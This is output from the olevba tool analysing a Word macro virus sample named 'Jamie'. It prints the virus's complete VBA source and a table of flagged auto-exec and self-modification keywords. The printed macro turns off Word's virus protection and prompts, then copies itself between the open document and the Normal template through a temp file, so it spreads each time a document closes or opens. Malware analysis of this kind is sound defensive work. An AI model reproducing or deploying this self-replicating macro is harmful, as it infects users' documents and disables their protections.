olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Jamie.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Jamie.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents.Item (1)
Options.ConfirmConversions = False
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
If AD.Name <> "Jamie" Then GoTo ADI
If NT.Name <> "Jamie" Then GoTo NTI
End
ADI:
Set MTI = AD
Set MTC = NT
OPM = "Private Sub Document_Close()"
AII = AD.CodeModule.CountOfLines
GoTo Install
NTI:
Set MTI = NT
Set MTC = AD
OPM = "Private Sub Document_Open()"
AII = NT.CodeModule.CountOfLines
GoTo Install
Install:
If AII = 0 Then
 MTC.Export ("Jamie.tmp")
 MTI.CodeModule.AddFromFile ("Jamie.tmp")
  With MTI.CodeModule
   For x = x To 3
   .DeleteLines 1
   Next
   .ReplaceLine 1, OPM
  End With
 Kill ("Jamie.tmp")
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
'.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.
'This Fine Product Coded By Lys KovicK
';';';';';';';';';';';';';';';';';';';

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

